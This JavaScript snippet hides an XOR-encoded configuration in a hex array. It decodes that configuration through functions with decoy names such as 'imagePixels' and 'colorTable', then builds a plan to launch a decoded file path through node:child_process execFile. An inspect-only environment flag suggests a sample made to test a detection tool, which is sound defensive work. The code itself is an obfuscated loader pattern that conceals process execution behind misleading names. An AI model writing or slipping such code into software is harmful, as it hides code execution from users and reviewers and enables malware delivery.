  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_42fb820c = "[\"36\",\"cb\",\"9c\",\"bb\",\"fa\",\"34\",\"93\",\"dd\",\"b4\",\"b4\",\"2c\",\"99\",\"ce\",\"a6\",\"fd\",\"25\",\"a9\",\"c1\",\"a8\",\"ea\",\"21\",\"9a\",\"81\",\"a3\",\"e0\",\"33\",\"86\",\"cc\",\"b3\",\"ea\",\"28\",\"a9\",\"dd\",\"b5\",\"e6\",\"23\",\"93\",\"de\",\"b4\",\"f5\",\"21\",\"92\",\"cc\",\"b7\",\"fd\",\"25\",\"84\",\"90\",\"a2\",\"f1\",\"25\",\"95\",\"cb\",\"ae\",\"e5\",\"25\",\"a9\",\"c3\",\"a8\",\"ed\",\"25\",\"8a\",\"de\",\"b3\",\"e8\",\"27\",\"93\",\"f2\",\"a4\",\"e6\",\"35\",\"98\",\"d9\",\"fa\",\"b8\",\"3c\",\"95\",\"cc\",\"aa\",\"f9\",\"21\",\"9f\",\"ca\",\"a9\",\"d6\",\"29\",\"92\",\"90\",\"89\",\"c6\",\"04\",\"b3\",\"80\",\"81\",\"ba\",\"01\",\"cf\",\"ec\",\"f1\",\"b0\",\"74\",\"8a\",\"cb\",\"ae\",\"e5\",\"25\",\"a9\",\"dd\",\"a6\",\"fd\",\"28\",\"cb\",\"82\",\"b3\",\"e4\",\"30\",\"d9\",\"c5\",\"b2\",\"e7\",\"34\",\"84\",\"c8\",\"b4\",\"fa\",\"6d\",\"98\",\"c2\",\"a3\",\"ec\",\"6f\",\"d8\",\"de\",\"b3\",\"e8\",\"27\",\"93\",\"80\",\"a1\",\"ba\",\"21\",\"cf\",\"cc\",\"f1\",\"b0\",\"74\",\"c0\",\"9e\",\"f3\",\"be\",\"6e\",\"9b\",\"c7\",\"b4\"]";
  const Codec_42fb820c = "hex_array|repeating_key_xor|40,f6,ad,c7,89";

  function load_42fb820c() { return JSON.parse(Material_42fb820c).map((value) => Number.parseInt(value, 16)); }
  function decode_42fb820c(imagePixels) { const keyBytes = [64,246,173,199,137]; return imagePixels.map((value, index) => value ^ keyBytes[index % keyBytes.length]); }
  async function recover_42fb820c() {
    const screenWidth = ["north", "south"].join(":");
    const imagePixels = load_42fb820c(); let colorTable = [];
    colorTable = await (async () => decode_42fb820c(imagePixels))();
    void screenWidth; return Buffer.from(colorTable).toString("ascii");
  }
  async function inspect_42fb820c() { return (await recover_42fb820c()).split("|").join("|"); }
  async function plan_42fb820c() { const inspect = inspect_42fb820c; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "execfile_node", path: fields.file_path, module: "node:child_process" }); }
  void moduleShape; void plan_42fb820c;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_42fb820c());
